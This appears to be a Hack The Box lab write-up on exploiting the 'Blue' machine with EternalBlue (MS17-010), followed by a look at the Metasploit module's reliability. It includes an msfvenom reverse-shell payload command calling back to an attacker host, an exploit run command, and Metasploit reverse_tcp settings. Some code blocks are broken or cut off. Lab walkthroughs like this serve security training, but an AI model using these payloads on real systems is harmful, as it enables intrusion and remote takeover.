title: 'HTB: Blue'

![intro](https://an00brektn.github.io/img/htb-blue/Pasted image 20210905175327.png)

## Intro
Blue is arguably the easiest box on the entire HTB platform. Root blood went in ~2 minutes, and for good reason. As the name of the box suggests, the vulnerability that we'll be focusing on is EternalBlue, an exploit developed by the NSA and leaked by the ShadowBrokers in 2017. I'll leverage this exploit without Metasploit to basically instantly get SYSTEM privileges. While the exploitation isn't that long, in Beyond the Flag, I'll look at the Metasploit module and (from an amateur's eyes) try and see what makes it so inconsistent as compared to the one I use.

## Recon
Always gotta **nmap** scan first.
```sh
kali@kali:~/ctf/htb/blue$ rustscan --ulimit 5000 10.10.10.40 -- -Pn -sC -sV -oN scans/initscan.txt

The easiest way to check for EternalBlue is to use nmap's `--script=vuln`, which will run all of the nse scripts tagged `vuln`.

```sh
kali@kali:~/ctf/htb/blue$ rustscan --ulimit 5000 10.10.10.40 -- -Pn --script=vuln
[you know what ports are open already]

If you were in a real engagement/assessment, you might just want to leave it at that and tell your client that they're susceptible to this attack. EternalBlue can break a system if you spam it too much, but because this is a lab environment, we're okay.

## Setting up the Exploit

There are many versions of this exploit out there; the one I will use is is [helviojunior's](https://github.com/helviojunior/MS17-010), which is a fork of [worawit's repo](https://github.com/worawit/MS17-010). Another that I've seen be used is from [3ndG4me](https://github.com/3ndG4me/AutoBlue-MS17-010), but I don't like it as much.

The repository that I use comes with a `send_and_execute.py` which we can use to trigger an msfvenom payload. I'll clone the repository into my `/opt` directory.
```sh
kali@kali:/opt$ sudo git clone https://github.com/helviojunior/MS17-010
Cloning into 'MS17-010'...
remote: Enumerating objects: 202, done.
remote: Total 202 (delta 0), reused 0 (delta 0), pack-reused 202
Receiving objects: 100% (202/202), 118.50 KiB | 689.00 KiB/s, done.
Resolving deltas: 100% (115/115), done.
```

I'll also need to set up a virtual enviornment since the exploit is in python2. Once that's done, the exploit also depends on impacket, which I'll install in the environment, along with impacket's dependencies.

```sh
kali@kali:/opt/MS17-010$ sudo virtualenv blue -p $(which python2)
created virtual environment CPython2.7.18.final.0-64 in 438ms

  activators BashActivator,CShellActivator,FishActivator,PowerShellActivator,PythonActivator
kali@kali:/opt/MS17-010$ source blue/bin/activate

[you don't want to see imports]
(blue) kali@kali:/opt/MS17-010$ cd ../impacket; sudo pip install .
[MORE IMPORTS]
```

Sometimes the exploit is finnicky and wants a non-empty credential, even though credentials aren't necessary most of the time.

```python
#!/usr/bin/python
from impacket import smb, smbconnection
from mysmb import MYSMB
from struct import pack, unpack, unpack_from
import sys
import socket
import time
import string
import random
import os.path

MS17-010 exploit for Windows 2000 and later by sleepya

Note:
- The exploit should never crash a target (chance should be nearly 0%)
- The exploit use the bug same as eternalromance and eternalsynergy, so named pipe is needed

Tested on:
- Windows 2016 x64
- Windows 10 Pro Build 10240 x64
- Windows 2012 R2 x64

```

We're now ready to exploit.

## Shell as Administrator

I'll generate a msfvenom payload as follows:
```bash
(blue) kali@kali:/opt/MS17-010$ sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 -e x86/shikata_ga_nai -f exe -o reverse.exe
```

All we have to do now is set up a listener and run the script. If I'm not recieving a meterpreter shell, I like to prepend my netcat listener with `rlwrap` so I can use the arrow keys.
```sh
(blue) kali@kali:/opt/MS17-010$ sudo python send_and_execute.py 10.10.10.40 reverse.exe

Now we can grab both flags.

## Beyond the Flag
After a quick reset to make sure nothing goes wrong, I'm going to try using Metasploit now.
```sh
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST tun0
LHOST => tun0
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
```

After running `exploit`, this happens:
```sh
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

I am by no means an expert (don't know Ruby that well, and I certainly don't know kernel exploit developement), but we can definitely try and walkthrough the code and see what's up. You can find it in the official Metasploit repository [here](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/smb/ms17_010_eternalblue.rb).

Here is a description of the exploit from Metasploit:
```sh
This module is a port of the Equation Group ETERNALBLUE exploit, part of
the FuzzBunch toolkit released by Shadow Brokers.

There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size
is calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error where a
DWORD is subtracted into a WORD. The kernel pool is groomed so that overflow
is well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later
completed in srvnet!SrvNetWskReceiveComplete.

This exploit, like the original may not trigger 100% of the time, and should be
run continuously until triggered. It seems like the pool will get hot streaks
and need a cool down period before the shells rain in again.

The module will attempt to use Anonymous login, by default, to authenticate to perform the
exploit. If the user supplies credentials in the SMBUser, SMBPass, and SMBDomain options it will use
those instead.

On some systems, this module may cause system instability and crashes, such as a BSOD or
a reboot. This may be more likely with some payloads.
```

In summary, it's kind of a hybrid between a kernel pool exploit and just a good ol' buffer overflow. This [article](https://www.sentinelone.com/blog/eternalblue-nsa-developed-exploit-just-wont-die/) by SentinelOne describes the components of the exploit. All together, it leverages a series of unfortunate events across three separate bugs. The first bug is a miscalculation of memory allocation between two data structures, opening up for a buffer overflow attack. The buffer overflow is triggerable thanks to the second bug that has to do with handling the size of packets in the SMB protocol, and the third bug ensures that memory for the shellcode can be allocated.

Below is lines 1176-1287 from the Metasploit version:

This is the main method that is running the exploit (looking at the Windows 7 and before version because the Windows 8 one is a little more complicated), and we can kind of see each step of the process here. We're crafting a malicious SMB packet to send to the IPC$ share, grooming the heap to increase the chances of landing the shell, and then attempting to trigger the payload from the corrupted connection itself.

I would try to dig deeper into each line so that we're not trying to work off of abstractions, but it would take me way longer than it should to *truly* understand the whole process. However, based on this, I have two theories as to why it might not work as consistently.

1. My Metasploit installation, although I haven't modified it since installing it, might have some issues.
2. Since the shellcode is being triggered through the connection, there's a good chance the grooming just fails. 

The Python script that I uses the exploit to upload and trigger a payload as SYSTEM. Since it's trying to execute a command over the connection rather than abuse the connection itself, I can only assume this is the reason Metasploit doesn't pop as consistently (assuming it's not an installation issue). Obviously, as the initial comments pointed out, is more prone to failure. However, a problem with the repository that I use is that I believe the payload is dropped to disk, which could be a problem if a machine has AV enabled. I haven't been able to test this out, but it's not out of the question.

This is definitely a step up from doing simple stack-based buffer overflows, but, even if I may or may not have found the reason, taking a deeper dive into the code makes me appreciate the exploit more than I did as opposed to when I would just aim, point, shoot.
